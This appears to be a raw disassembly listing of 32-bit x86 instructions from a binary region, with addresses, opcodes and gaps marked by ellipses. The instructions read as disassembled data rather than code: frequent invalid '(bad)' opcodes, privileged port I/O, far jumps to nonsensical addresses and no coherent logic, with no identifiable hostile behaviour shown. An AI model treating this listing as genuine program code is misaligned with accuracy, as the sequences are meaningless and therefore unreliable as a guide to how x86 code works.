  428a8a:	add    BYTE PTR [eax],al
  428a8c:	(bad)  
  428a8d:	cmp    eax,0xb127f696
  428a92:	push   0xfff24281
  428a97:	lock dec edi
  428a99:	or     BYTE PTR [eax+0x64],al
  428a9c:	clc    
  428a9d:	xchg   esi,eax
  428a9e:	push   0x52010264
  428aa3:	xor    BYTE PTR [ebx],dh
  428aa5:	stos   DWORD PTR es:[edi],eax
  428aa6:	mov    bh,0xf8
  428aa8:	xor    al,BYTE PTR [edx+0x2cb09b96]
  428aae:	aad    0xa8
  428ab0:	out    0x72,eax
  428ab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428ab3:	jmp    0x74f8:0x6e0788f6
  428aba:	jp     0x428b13
  428abc:	(bad)  
  428abd:	push   ebx
  428abe:	loope  0x428a83
  428ac0:	sbb    ebp,DWORD PTR [si-0x6da2]
  428ac5:	push   0xffffff98
  428ac7:	xchg   edi,eax
  428ac8:	iret   
  428ac9:	or     BYTE PTR [ecx-0x45fd994d],ch
  428acf:	jne    0x428b03
  428ad1:	sbb    BYTE PTR [eax-0x666b6982],ah
  428ad7:	out    dx,al
  428ad8:	pop    ebx
  428ad9:	aaa    
  428ada:	test   eax,0x78dd6ced
  428adf:	lahf   
  428ae0:	sbb    dl,BYTE PTR [esi]
  428ae2:	adc    ebp,DWORD PTR [eax]
  428ae4:	xor    DWORD PTR [ebp+edi*8-0x6e],0x5508d9af
  428aec:	xchg   ecx,eax
  428aed:	loope  0x428b26
  428aef:	(bad)  
  428af1:	in     al,dx
  428af2:	xor    al,0x88
  428af4:	leave  
  428af5:	outs   dx,DWORD PTR ds:[esi]
  428af6:	adc    eax,0xbf40edf9
  428afb:	shr    BYTE PTR [ecx],cl
  428afd:	(bad)  
  428afe:	fs mov ebp,0xa7ec4b13
  428b04:	mov    eax,0x60ebb2cf
  428b09:	je     0x428ae6
  428b0b:	or     DWORD PTR [eax-0x167ed2d7],esi
  428b11:	jns    0x428abf
  428b13:	in     eax,0x27
  428b15:	mov    bl,0xc2
  428b17:	jno    0x428b56
  428b19:	jbe    0x428a9e
  428b1b:	scas   eax,DWORD PTR es:[edi]
  428b1c:	out    dx,eax
  428b1d:	mov    cl,0x69
  428b1f:	test   al,0x61
  428b21:	fdiv   st(3),st
  428b23:	pop    ebx
  428b24:	daa    
  428b25:	ja     0x428b3d
  428b27:	jae    0x428ba6
  428b29:	adc    ecx,DWORD PTR [ebx+0x449775e9]
  428b2f:	sbb    DWORD PTR [edi+eax*8-0x2f1eb74b],edx
  428b36:	push   ecx
  428b37:	ret    0x535a
  428b3a:	sbb    esi,DWORD PTR [edx-0x55eb697a]
  428b40:	retf   0xeb9c
  428b43:	pop    ss
  428b44:	fs aas 
  428b46:	push   ds
  428b47:	fwait
  428b48:	mov    ch,0xcd
  428b4a:	call   0xb1a6:0xa46c1d29
  428b51:	pop    ecx
  428b52:	pop    edx
  428b53:	inc    ebx
  428b54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b56:	mov    ecx,0x5a097ef
  428b5b:	pop    ebx
  428b5c:	xchg   edx,eax
  428b5d:	mov    al,ds:0xe2580748
  428b62:	or     eax,0x200c15b3
  428b67:	fistp  WORD PTR [ebp+0x5]
  428b6a:	sbb    cl,bh
  428b6c:	mov    ds,WORD PTR [ebx-0x3d]
  428b6f:	inc    edi
  428b70:	stos   DWORD PTR es:[edi],eax
  428b71:	jle    0x428b70
  428b73:	out    dx,al
  428b74:	ret    0xb052
  428b77:	mov    edi,0x67c668fe
  428b7c:	mov    BYTE PTR [ebp+0x18],bl
  428b7f:	enter  0xe946,0x11
  428b83:	mov    edi,ds
  428b85:	pop    esp
  428b86:	or     al,0x94
  428b88:	cmp    DWORD PTR [ebx-0x303f9cf1],esp
  428b8e:	lods   al,BYTE PTR ds:[esi]
  428b8f:	xor    esi,DWORD PTR [ecx]
	...
  428bf1:	add    BYTE PTR [eax],al
  428bf3:	add    ch,al
  428bf5:	push   ebp
  428bf6:	mov    bh,dl
  428bf8:	call   0xbbc:0x947ff5ff
  428bff:	push   0x11925a69
  428c04:	xor    dh,BYTE PTR [ecx+eax*1+0x10500]
  428c0b:	add    BYTE PTR [ebx],bh
  428c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c0e:	clc    
  428c0f:	sbb    DWORD PTR [edi+0x14],edi
  428c12:	int3   
  428c13:	aad    0x20
  428c15:	mov    edi,0x2f890dcd
  428c1a:	(bad)  
  428c1b:	pop    ecx
  428c1c:	inc    ebx
  428c1d:	jns    0x428c0a
  428c1f:	outs   dx,DWORD PTR ds:[esi]
  428c20:	cmc    
  428c21:	cwde   
  428c22:	cmc    
  428c23:	fnstenv [eax]
  428c25:	inc    esi
  428c26:	mov    esp,0x5c251db2
  428c2b:	add    al,BYTE PTR [eax+ebp*2]
  428c2e:	retf   
  428c2f:	or     BYTE PTR [eax],ch
  428c31:	mov    ds:0x73c56602,eax
  428c36:	lea    ebp,[eax+esi*1-0x77]
  428c3a:	pop    ebx
  428c3b:	aaa    
  428c3c:	xor    eax,0x3f13a139
  428c41:	sbb    DWORD PTR [edi-0x3b9db426],0xa2361cd9
  428c4b:	sub    DWORD PTR [eax+esi*1],ecx
  428c4e:	push   0xffffffe7
  428c50:	dec    ebx
  428c51:	fdiv   st(6),st
  428c53:	add    DWORD PTR [edi],0xe667295e
  428c59:	(bad)  [esi+eiz*8]
  428c5c:	out    dx,al
  428c5d:	and    eax,0x6f63ae3c
  428c62:	nop
  428c63:	jo     0x428c34
  428c65:	cdq    
  428c66:	or     al,0x58
  428c68:	xchg   ecx,eax
  428c69:	push   ecx
  428c6a:	push   ebp
  428c6b:	rol    BYTE PTR [esi+0x444e9b46],cl
  428c71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c72:	inc    esi
  428c73:	push   esp
  428c74:	mov    dh,0xc2
  428c76:	mov    ah,bl
  428c78:	rcl    esi,cl
  428c7a:	push   ds
  428c7b:	mov    ebp,0xd663e98f
  428c80:	and    al,BYTE PTR ss:[edi-0xb]
  428c84:	lea    ebx,[edx]
  428c86:	adc    eax,0xe682a37d
  428c8b:	add    eax,0x3436b024
  428c90:	xor    ch,BYTE PTR [eax+0xc643277]
  428c96:	or     al,0x47
  428c98:	xchg   DWORD PTR [ebx-0x29],edi
  428c9b:	sbb    eax,0xb4fb4ed2
  428ca0:	mov    edx,0x77f071d3
  428ca5:	scas   eax,DWORD PTR es:[edi]
  428ca6:	pop    es
  428ca7:	mov    al,ds:0x1180a27d
  428cac:	enter  0xeedf,0xce
  428cb0:	(bad)  
  428cb1:	fistp  WORD PTR [eax]
  428cb3:	push   ebx
  428cb4:	je     0x428cb5
  428cb6:	ins    DWORD PTR es:[edi],dx
  428cb7:	pcmpgtd mm7,QWORD PTR [eax+0x74]
  428cbb:	sub    esp,eax
  428cbd:	iret   
  428cbe:	cmp    ebp,ebx
  428cc0:	dec    edi
  428cc1:	ror    bl,0x66
  428cc4:	es out dx,al
  428cc6:	pop    edi
  428cc7:	out    0x5c,al
  428cc9:	adc    ebx,DWORD PTR [ebx+0x246eb4fd]
  428ccf:	stos   BYTE PTR es:[edi],al
  428cd0:	int    0x8f
  428cd2:	jg     0x428d23
  428cd4:	adc    al,0x85
  428cd6:	jmp    0xb47bbc7b
  428cdb:	push   esi
  428cdc:	lahf   
  428cdd:	xor    ebp,DWORD PTR [edi+edi*4-0x6cd7f0d0]
  428ce4:	pop    edi
  428ce5:	cmp    al,0x5f
  428ce7:	jnp    0x428d15
  428ce9:	in     al,dx
  428cea:	arpl   di,bp
  428cec:	gs xchg esp,eax
  428cee:	cdq    
  428cef:	in     al,dx
  428cf0:	mov    ds:0xdfeb35b9,al
  428cf5:	jbe    0x428cec
  428cf7:	mov    ebp,0x753a5d30
  428cfc:	dec    esp
  428cfd:	push   eax
  428cfe:	jo     0x428d51
  428d00:	les    ebx,FWORD PTR [ebx]
  428d02:	aam    0x6e
  428d04:	cwde   
  428d05:	sbb    DWORD PTR [ebp-0x3],0x99161650
  428d0c:	das    
  428d0d:	sbb    bh,BYTE PTR [ebx+0x8c05]
	...
  428d73:	add    BYTE PTR [ecx-0xace0e4b],al
  428d79:	jne    0x428d3c
  428d7b:	mov    ch,0x90
  428d7d:	int3   
  428d7e:	ins    BYTE PTR es:[edi],dx
  428d7f:	retf   0xd18
  428d82:	js     0x428d48
  428d84:	aaa    
  428d85:	mov    ch,0x1
  428d87:	add    BYTE PTR ds:0xb5000001,al
  428d8d:	or     DWORD PTR [edi],ecx
  428d8f:	mov    WORD PTR [ecx+ecx*8-0x1001bccb],?
  428d96:	jmp    0x428d3c
  428d98:	enter  0x5f77,0x37
  428d9c:	pop    edx
  428d9d:	loop   0x428d8a
  428d9f:	fimul  WORD PTR [edi+edx*8-0x63]
  428da3:	das    
  428da4:	xor    al,BYTE PTR [ecx-0x3f5b3e35]
  428daa:	add    esi,esi
  428dac:	call   eax
  428dae:	in     eax,0xd9
  428db0:	push   esi
  428db1:	push   cs
  428db2:	jnp    0x428d74
  428db4:	cli    
  428db5:	in     al,0x9a
  428db7:	sub    eax,DWORD PTR [esi-0x18adc568]
  428dbd:	loope  0x428d64
  428dbf:	pop    es
  428dc0:	(bad)  
  428dc1:	data16 or BYTE PTR [ecx-0x60],0xcc
  428dc6:	arpl   WORD PTR [edi],bp
  428dc8:	pop    DWORD PTR [edx+eax*8-0x10]
  428dcc:	clc    
  428dcd:	call   0xb0ddfc8b
  428dd2:	mov    ecx,DWORD PTR [edi+0x11]
  428dd5:	test   DWORD PTR [edx+0x4a],ebx
  428dd8:	jecxz  0x428e46
  428dda:	mov    al,ds:0x5eb8ef8
  428ddf:	sbb    eax,0xf74624ac
  428de4:	test   eax,0xc24ec4f7
  428de9:	sbb    BYTE PTR [eax+0x22b9d4f5],ah
  428def:	pusha  
  428df0:	je     0x428d88
  428df2:	rcl    BYTE PTR [ebp-0x2435fcac],0x6e
  428df9:	sbb    ecx,DWORD PTR [esi]
  428dfb:	add    ebp,DWORD PTR [eax-0x28]
  428dfe:	imul   BYTE PTR [edx+0x68]
  428e01:	xchg   edi,eax
  428e02:	mov    eax,DWORD PTR [esp+edi*8+0x710ad3da]
  428e09:	xchg   ecx,eax
  428e0a:	mov    eax,0x3e098630
  428e0f:	adc    al,0xdc
  428e11:	jp     0x428df9
  428e13:	dec    esi
  428e14:	rol    BYTE PTR [edi],cl
  428e16:	pop    es
  428e17:	rcl    DWORD PTR [ebx],cl
  428e19:	pushf  
  428e1a:	pop    es
  428e1b:	or     eax,0xf3b26e4c
  428e20:	lahf   
  428e21:	mov    ebp,0xb88bc301
  428e26:	jmp    0xd0a7:0xd3f57683
  428e2d:	into   
  428e2e:	and    dh,dh
  428e30:	dec    ebx
  428e31:	add    esi,DWORD PTR [eax+0x33ad2b20]
  428e37:	fdiv   DWORD PTR [edx+0x3c69d508]
  428e3d:	sbb    BYTE PTR [eax+0x38776dbc],bh
  428e43:	dec    ebp
  428e44:	in     eax,0xbc
  428e46:	sbb    BYTE PTR [ebx-0x133ec2f6],cl
  428e4c:	enter  0xfc0c,0x89
  428e50:	jno    0x428ec7
  428e52:	(bad)  
  428e53:	sbb    eax,0x23e378d5
  428e58:	out    0x27,al
  428e5a:	les    ebp,FWORD PTR [ecx+ebx*1+0x6c670ba8]
  428e61:	add    bh,dl
  428e63:	adc    bl,ah
  428e65:	mov    esp,0x372889d0
  428e6a:	jmp    0x428ecf
  428e6c:	in     al,0x1b
  428e6e:	push   ebx
  428e6f:	rcr    DWORD PTR [esi+0x68],1
  428e72:	pushf  
  428e73:	cmp    eax,0xaa1479a7
  428e78:	hlt    
  428e79:	jp     0x428ef0
  428e7b:	retf   
  428e7c:	mov    bl,0x9a
  428e7e:	inc    ebp
  428e7f:	leave  
  428e80:	arpl   WORD PTR [ebx-0x1014cf81],si
  428e86:	sub    eax,0x11602e8d
  428e8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428e8c:	aam    0x3c
  428e8e:	ds xchg edx,eax
  428e90:	aas    
	...
  428ef1:	add    BYTE PTR [eax],al
  428ef3:	add    BYTE PTR [edi+0x5d],cl
  428ef6:	pop    ecx
  428ef7:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428efb:	fstp   st(1)
  428efd:	ror    DWORD PTR [esp+edx*4],0xf3
  428f01:	or     BYTE PTR [esi+0x37],bl
  428f04:	cmp    al,0xb6
  428f06:	add    DWORD PTR [eax],eax
  428f08:	add    eax,0x62000001
  428f0d:	retf   
  428f0e:	jbe    0x428f3c
  428f10:	shl    BYTE PTR [ecx+0x3f],0xe0
  428f14:	test   DWORD PTR [edi-0x5fde3305],esi
  428f1a:	lds    esp,FWORD PTR [eax+0x72e63f16]
  428f20:	loop   0x428f7a
  428f22:	retf   0xf569
  428f25:	ins    BYTE PTR es:[edi],dx
  428f26:	inc    ecx
  428f27:	add    eax,0x6d5b65b9
  428f2c:	ret    
  428f2d:	mov    edi,0xd07725d6
  428f32:	jg     0x428f78
  428f34:	add    BYTE PTR [eax],ah
  428f36:	addr16 cli 
  428f38:	out    0x2e,eax
  428f3a:	into   
  428f3b:	into   
  428f3c:	scas   eax,DWORD PTR es:[edi]
  428f3d:	ja     0x428f7b
  428f3f:	xor    DWORD PTR [ecx+0x62dd8b8a],ecx
  428f45:	stos   BYTE PTR es:[edi],al
  428f46:	pop    es
  428f47:	jp     0x428f49
  428f49:	xchg   DWORD PTR [eax+0x6f356858],ebp
  428f4f:	std    
  428f50:	dec    ecx
  428f51:	xchg   DWORD PTR [esi+0x29],ecx
  428f54:	out    dx,eax
  428f55:	dec    DWORD PTR [esi-0x20]
  428f58:	mov    al,ds:0x87541c0d
  428f5d:	mov    ds:0x4ac0ed68,al
  428f62:	js     0x428fc2
  428f64:	mov    ecx,0xf945d7ee
  428f69:	cli    
  428f6a:	cli    
  428f6b:	arpl   WORD PTR [ebp+0x2e4d5e53],cx
  428f71:	ds and dh,0xac
  428f75:	inc    esi
  428f76:	bnd jno 0x428fd3
  428f79:	data16 cmp al,0xa
  428f7c:	and    ah,BYTE PTR [eax+edi*2]
  428f7f:	cwde   
  428f80:	adc    DWORD PTR [ecx-0x113585eb],ecx
  428f86:	into   
  428f87:	adc    eax,0xb455b044
  428f8c:	rcr    edx,0x38
  428f8f:	sar    DWORD PTR [edi-0xa981a9f],1
  428f95:	out    0xd3,eax
  428f97:	fwait
  428f98:	ds push es
  428f9a:	xchg   ecx,eax
  428f9b:	pop    esi
  428f9c:	mov    cl,0xb
  428f9e:	sub    esp,0xffffffe3
  428fa1:	lods   al,BYTE PTR ds:[esi]
  428fa2:	push   esi
  428fa3:	sub    eax,0x5099ee45
  428fa8:	repz retf 
  428faa:	mov    ecx,0xf4be9d7
  428faf:	jns    0xdea3100
  428fb5:	pop    edi
  428fb6:	sbb    ch,BYTE PTR [edi+0x3b]
  428fb9:	mov    eax,0xef0c392d
  428fbe:	jl     0x428ffa
  428fc0:	out    dx,eax
  428fc1:	sub    al,0x8e
  428fc3:	cli    
  428fc4:	fstp   DWORD PTR [ebx]
  428fc6:	pop    ds
  428fc7:	mov    ah,0x49
  428fc9:	jno    0x428f62
  428fcb:	inc    ebx
  428fcc:	out    dx,al
  428fcd:	push   edx
  428fce:	mov    dl,0x55
  428fd0:	aaa    
  428fd1:	and    ebp,edx
  428fd3:	cwde   
  428fd4:	jecxz  0x428fb2
  428fd6:	hlt    
  428fd7:	dec    ecx
  428fd8:	adc    dh,BYTE PTR [eax+0x71]
  428fdb:	stos   BYTE PTR es:[edi],al
  428fdc:	lea    edx,[esi-0x6a]
  428fdf:	jns    0x428fe3
  428fe1:	rcl    DWORD PTR ss:[eax],cl
  428fe4:	les    edi,FWORD PTR [ebx+0x2ef38b81]
  428fea:	xor    BYTE PTR [ecx],cl
  428fec:	iret   
  428fed:	push   0xc5df42af
  428ff2:	outs   dx,BYTE PTR ds:[esi]
  428ff3:	cmp    al,0x92
  428ff5:	adc    al,0x3c
  428ff7:	push   es
  428ff8:	lahf   
  428ff9:	xor    eax,0x4e463993
  428ffe:	push   es
  428fff:	jmp    0x429000
  429001:	cmp    dh,BYTE PTR [esi-0x70]
  429004:	ret    
  429005:	call   0xe67fc13f
  42900a:	aaa    
  42900b:	pushf  
  42900c:	inc    eax
  42900d:	call   DWORD PTR [edx]
  42900f:	outs   dx,BYTE PTR ds:[esi]
  429010:	clc    
	...
  429071:	add    BYTE PTR [eax],al
  429073:	add    cl,ah
  429075:	in     al,dx
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0xbefc7b77
  429081:	adc    DWORD PTR [edx+0x1b7411f],edx
  429087:	add    BYTE PTR ds:0xf8000001,al
  42908d:	or     al,0x8c
  42908f:	fisttp DWORD PTR [esi+0x497d9209]
  429095:	mov    ebp,0x5584b8f2
  42909a:	add    bl,BYTE PTR [eax+0x6b]
  42909d:	mov    ebx,0x83094bb8
  4290a2:	xchg   ebp,eax
  4290a3:	pop    esi
  4290a4:	dec    edx
  4290a5:	push   ebx
  4290a6:	pop    edx
  4290a7:	xor    al,0x9d
  4290a9:	or     bh,BYTE PTR [edx]
  4290ab:	fld    st(6)
  4290ad:	mov    DWORD PTR [eax+edx*4-0x65b3eed7],esi
  4290b4:	data16 mov bh,0xcd
  4290b7:	lock lods eax,DWORD PTR ds:[esi]
  4290b9:	ret    
  4290ba:	(bad)  [ecx]
  4290bc:	jno    0x429082
  4290be:	adc    dh,ah
  4290c0:	(bad)  
  4290c1:	les    esi,FWORD PTR [esi+ebp*2+0x5110aea4]
  4290c8:	mov    DWORD PTR [ebx+edx*8-0x44ed7754],esp
  4290cf:	xchg   esp,eax
  4290d0:	ret    0x497
  4290d3:	into   
  4290d4:	pop    eax
  4290d5:	pop    es
  4290d6:	imul   esp,ebp,0x67
  4290d9:	cld    
  4290da:	out    0x60,al
  4290dc:	pop    ds
  4290dd:	pop    ebx
  4290de:	lods   eax,DWORD PTR ds:[esi]
  4290df:	fadd   st,st(3)
  4290e1:	nop
  4290e2:	push   edi
  4290e3:	or     dl,bh
  4290e5:	xor    al,0x3b
  4290e7:	push   edx
  4290e8:	ja     0x429122
  4290ea:	or     edx,edx
  4290ec:	sti    
  4290ed:	sub    al,0x6
  4290ef:	pop    esi
  4290f0:	call   0xfa9409bd
  4290f5:	into   
  4290f6:	clc    
  4290f7:	xchg   edi,eax
  4290f8:	shl    BYTE PTR [edi-0x18],1
  4290fb:	fdivr  QWORD PTR [esi-0x1a785781]
  429101:	xchg   DWORD PTR ds:0x752bf343,esi
  429107:	dec    edi
  429108:	pop    ecx
  429109:	(bad)  
  42910a:	and    cl,ch
  42910c:	retf   
  42910d:	jae    0x429175
  42910f:	iret   
  429110:	cmp    BYTE PTR [edi+0x77c6723b],cl
  429116:	call   0x9c47a0c6
  42911b:	xchg   ebp,eax
  42911c:	inc    eax
  42911d:	mov    eax,DWORD PTR [ecx+ebx*4+0x3596dd57]
  429124:	gs sub ch,dh
  429127:	inc    ebp
  429128:	xchg   ebp,eax
  429129:	mov    al,ds:0x30ce0391
  42912e:	frstor [edx-0x12ef8a24]
  429134:	jp     0x429177
  429136:	aad    0xbe
  429138:	adc    eax,0xbac80eb9
  42913d:	sub    esp,DWORD PTR [eax+ecx*2]
  429140:	sub    al,0x81
  429142:	sub    edx,edx
  429144:	jno    0x42917f
  429146:	push   0xffffffe8
  429148:	aad    0x9e
  42914a:	mov    cl,0x9
  42914c:	xor    DWORD PTR [ebp+0x55280a6],ebp
  429152:	(bad)  
  429153:	and    al,0x13
  429155:	sub    al,al
  429157:	jne    0x42918d
  429159:	ins    BYTE PTR es:[edi],dx
  42915a:	pop    edx
  42915b:	pop    ebp
  42915c:	jns    0x42915a
  42915e:	add    BYTE PTR [ebx+eiz*1-0x324f03b5],dl
  429165:	mov    ds:0x58648cb1,al
  42916a:	add    al,0xe6
  42916c:	adc    ah,al
  42916e:	push   edi
  42916f:	clc    
  429170:	js     0x429198
  429172:	cmp    DWORD PTR [edi+0x40435818],0xd241747a
  42917c:	mov    al,ds:0xdbe69747
  429181:	and    eax,DWORD PTR [eax]
  429183:	cmp    cl,cl
  429185:	sub    ecx,eax
  429187:	stos   BYTE PTR es:[edi],al
  429188:	push   ebx
  429189:	jae    0x4291c0
  42918b:	scas   eax,DWORD PTR es:[edi]
  42918c:	add    al,0x6a
  42918e:	dec    edi
  42918f:	fdivr  QWORD PTR [eax+0x0]
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ecx+edx*8+0x467f4030],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [ebp-0x1bcb4608],bh
  429211:	aaa    
  429212:	sti    
  429213:	outs   dx,BYTE PTR ds:[esi]
  429214:	sub    BYTE PTR [edi],0x4a
  429217:	imul   ebp,DWORD PTR [eax-0x11],0x32
  42921b:	cmp    BYTE PTR [edx-0x80],bh
  42921e:	jg     0x4291a3
  429220:	cs into 
  429222:	popa   
  429223:	inc    ebp
  429224:	mov    ebx,0xf31ac704
  429229:	push   0x0
  42922b:	inc    ebx
  42922c:	ins    DWORD PTR es:[edi],dx
  42922d:	mov    ?,ebp
  42922f:	aaa    
  429230:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429231:	ins    DWORD PTR es:[edi],dx
  429232:	mov    DWORD PTR [ebp+0x3a6c1f65],edx
  429238:	or     al,0xb1
  42923a:	inc    ebp
  42923b:	hlt    
  42923c:	sbb    BYTE PTR [esi-0x2c],0x62
  429240:	jecxz  0x429200
  429242:	aam    0x8c
  429244:	push   ebp
  429245:	dec    esp
  429246:	cmc    
  429247:	add    esi,edi
  429249:	jmp    0x933089bf
  42924e:	adc    al,0xa6
  429250:	vpsravd ymm6,ymm3,YMMWORD PTR [ebx]
  429255:	cmp    DWORD PTR [edx+0x18],ecx
  429258:	and    al,0xb5
  42925a:	js     0x4292c0
  42925c:	ficom  WORD PTR [eax+0x404c09e2]
  429262:	jl     0x429247
  429264:	std    
  429265:	into   
  429266:	mov    bh,0xac
  429268:	cdq    
  429269:	pop    ebp
  42926a:	add    cl,BYTE PTR [ebx]
  42926c:	pop    eax
  42926d:	pop    eax
  42926e:	sbb    dl,BYTE PTR [ebp+0x30]
  429271:	loopne 0x429241
  429273:	test   eax,0x3d790f46
  429278:	je     0x42920c
  42927a:	mov    bl,0x2
  42927c:	repz push ebp
  42927e:	leave  
  42927f:	sbb    bh,BYTE PTR [ebx+0x39bba2b8]
  429285:	js     0x429224
  429287:	pop    edx
  429288:	in     eax,0xd4
  42928a:	in     al,0xd1
  42928c:	add    ah,BYTE PTR [eax+0x3d]
  42928f:	imul   esi,DWORD PTR [esi],0xc5cb9e0f
  429295:	xor    BYTE PTR [ecx-0x5ee7cb5f],bl
  42929b:	enter  0x428d,0xf9
  42929f:	imul   edi,DWORD PTR [ecx-0x25eeb8ee],0xffffffaf
  4292a6:	fs je  0x42924b
  4292a9:	fwait
  4292aa:	retf   0x9c7f
  4292ad:	inc    ebp
  4292ae:	or     DWORD PTR ds:[ecx+edi*8-0x7f],eax
  4292b3:	xchg   ebp,eax
  4292b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4292b5:	jne    0x4292dc
  4292b7:	lods   eax,DWORD PTR ds:[esi]
  4292b8:	mov    esp,0xe1ab1c2
  4292bd:	out    dx,al
  4292be:	mov    ebx,ebx
  4292c0:	idiv   DWORD PTR ds:0x5238de0d
  4292c6:	sub    al,0xd
  4292c8:	in     al,0x47
  4292ca:	fwait
  4292cb:	cld    
  4292cc:	addr16 xor eax,0x2bd42703
  4292d2:	jmp    0x429323
  4292d4:	mov    eax,ds:0xeb6dc5f0
  4292d9:	xchg   edi,eax
  4292da:	inc    edi
  4292db:	mov    edx,0xfbba1a38
  4292e0:	lahf   
  4292e1:	fs dec ecx
  4292e3:	jg     0x42927d
  4292e5:	fimul  WORD PTR [edi]
  4292e7:	xlat   BYTE PTR ds:[ebx]
  4292e8:	add    BYTE PTR [edi-0x12d02e7],dl
  4292ee:	jg     0x429363
  4292f0:	and    eax,0x5c333ed6
  4292f5:	mov    eax,ds:0x72fb962a
  4292fa:	je     0x429298
  4292fc:	mov    cl,0x61
  4292fe:	sbb    eax,0xc80a48f0
  429303:	outs   dx,DWORD PTR ds:[esi]
  429304:	cmp    ah,BYTE PTR [ebx-0x74]
  429307:	pop    edx
  429308:	stos   BYTE PTR es:[edi],al
  429309:	(bad)  
  42930a:	adc    al,BYTE PTR [esp+eax*2-0x42]
  42930e:	mov    edx,0xf2d1
	...
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xad
  429381:	mov    edi,0xb94b3914
  429386:	add    DWORD PTR [eax],eax
  429388:	add    eax,0x4d000001
  42938d:	add    al,BYTE PTR [edi+0x607fe8d3]
  429393:	adc    eax,DWORD PTR [ebx-0x7d]
  429396:	data16 sbb al,0xea
  429399:	ret    
  42939a:	jae    0x42936f
  42939c:	imul   esi,ebx,0x20be685
  4293a2:	fisub  WORD PTR [eax+0x7b]
  4293a5:	je     0x42932d
  4293a7:	pop    esi
  4293a8:	sbb    al,0xab
  4293aa:	adc    BYTE PTR [ecx-0x7c],ah
  4293ad:	push   0xffffffd4
  4293af:	pusha  
  4293b0:	dec    ecx
  4293b1:	cmp    ecx,DWORD PTR [esi]
  4293b3:	mov    cl,0xcc
  4293b5:	ins    BYTE PTR es:[edi],dx
  4293b6:	xlat   BYTE PTR ds:[ebx]
  4293b7:	jb     0x429431
  4293b9:	(bad)  
  4293bb:	cs stos BYTE PTR es:[edi],al
  4293bd:	jne    0x42940c
  4293bf:	test   al,0xe6
  4293c1:	xor    eax,0x3b230ee5
  4293c6:	or     ebp,DWORD PTR [edi-0x167f768d]
  4293cc:	outs   dx,DWORD PTR ds:[esi]
  4293cd:	lahf   
  4293ce:	stc    
  4293cf:	hlt    
  4293d0:	push   ecx
  4293d1:	retf   0xcff0
  4293d4:	jmp    0x1b30:0x79e3819d
  4293db:	(bad)  
  4293de:	add    al,0xf2
  4293e0:	sti    
  4293e1:	cmc    
  4293e2:	loope  0x4293d1
  4293e4:	or     BYTE PTR [esi],ch
  4293e6:	rol    edx,0xe0
  4293e9:	adc    edi,ebp
  4293eb:	js     0x4293fc
  4293ed:	sti    
  4293ee:	xchg   eax,edi
  4293f0:	sti    
  4293f1:	push   0xffffffce
  4293f3:	lock faddp st(2),st
  4293f6:	dec    edx
  4293f7:	inc    edi
  4293f8:	enter  0xeb2b,0x6e
  4293fc:	in     eax,dx
  4293fd:	in     al,dx
  4293fe:	fdivr  st,st(3)
  429400:	icebp  
  429401:	fidivr WORD PTR [edi]
  429403:	mov    cl,0x8b
  429405:	scas   al,BYTE PTR es:[edi]
  429406:	cwde   
  429407:	sub    ch,ah
  429409:	add    al,BYTE PTR [ebx+0x151a045]
  42940f:	mov    al,0x52
  429411:	xor    DWORD PTR [esi],ebp
  429413:	in     eax,dx
  429414:	adc    DWORD PTR [edx+0x41a072a8],0xae31eeb6
  42941e:	outs   dx,DWORD PTR ds:[esi]
  42941f:	xor    al,0xd7
  429421:	xchg   ebp,eax
  429422:	fild   WORD PTR [esi]
  429424:	add    esi,DWORD PTR [edx+0xb67f5e1]
  42942a:	mov    al,0x18
  42942c:	data16 mov bl,0xea
  42942f:	mov    fs,edx
  429431:	dec    ecx
  429432:	imul   ecx,DWORD PTR [esi],0x92f60eff
  429438:	push   ds
  429439:	add    al,0xc6
  42943b:	inc    esi
  42943c:	loopne 0x42940b
  42943e:	mul    esp
  429440:	mov    edi,0xd98c4aa1
  429445:	in     al,0x22
  429447:	mov    bl,0x64
  429449:	fisub  DWORD PTR [edi]
  42944b:	arpl   WORD PTR [ebp+0x19],bp
  42944e:	imul   eax,DWORD PTR [eax+edi*8-0x71],0x38597ead
  429456:	cli    
  429457:	xor    BYTE PTR [edx+0x78090538],bh
  42945d:	(bad)  
  42945e:	dec    edx
  42945f:	adc    DWORD PTR [edi-0x13],ebp
  429462:	jno    0x42940d
  429464:	jmp    DWORD PTR [edi+0x3a]
  429467:	fstp   st(2)
  429469:	jo     0x4294c5
  42946b:	fbstp  TBYTE PTR [eax-0x7]
  42946e:	sbb    ah,BYTE PTR [ecx]
  429470:	jecxz  0x429454
  429472:	xchg   edx,eax
  429473:	lock mov bh,0xca
  429476:	mov    ebx,0xc8116918
  42947b:	mov    ds:0x3c599169,eax
  429480:	xchg   cl,dh
  429482:	add    al,0xeb
  429484:	push   esi
  429485:	mov    ds:0xba774727,eax
  42948a:	xor    al,0xf6
  42948c:	sub    BYTE PTR [edx+0x51a884],dl
	...
  4294f2:	add    BYTE PTR [eax],al
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x31b057ea],dx
  429503:	mov    esp,0x1ba50
  429508:	add    eax,0xf5000001
  42950d:	cli    
  42950e:	imul   edx,DWORD PTR [edx+0x346f53db],0x63
  429515:	xchg   ecx,eax
  429516:	jle    0x4294b0
  429518:	(bad)  
  429519:	repnz cmp DWORD PTR ds:0xa9b4e29f,edi
  429520:	retf   0xb54f
